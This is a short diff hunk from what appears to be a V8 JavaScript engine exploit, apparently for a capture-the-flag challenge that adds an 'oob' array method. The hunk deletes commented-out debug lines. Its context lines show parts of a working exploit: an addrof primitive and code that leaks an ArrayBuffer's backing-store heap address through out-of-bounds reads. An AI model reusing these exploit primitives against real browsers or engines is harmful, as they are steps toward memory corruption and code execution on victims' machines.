@@ -39,16 +39,6 @@ function addrof(obj) {
   return ftoi(a.oob(11)) & 0xffffffffn;
 }
 
-// some basic tests
-// %DebugPrint(a);
-// %DebugPrint(obj_arr);
-// %DebugPrint(buffer);
-// console.log(getHexString(a.oob(0))); // oob from FixedDoubleArray (each 8 bytes)
-// console.log(getHexString(a.oob(1)));
-// console.log(getHexString(a.oob(2)));
-// a.oob(0, 3.3);
-// console.log(a[0]);
-
 // get heap address (backing store of buffer)
 const backing_store = (ftoi(a.oob(17)) >> 32n) + ((ftoi(a.oob(18)) & 0xffffffffn) << 32n);
 console.log("[*] backing store address : " + getHexString(itof(backing_store)));
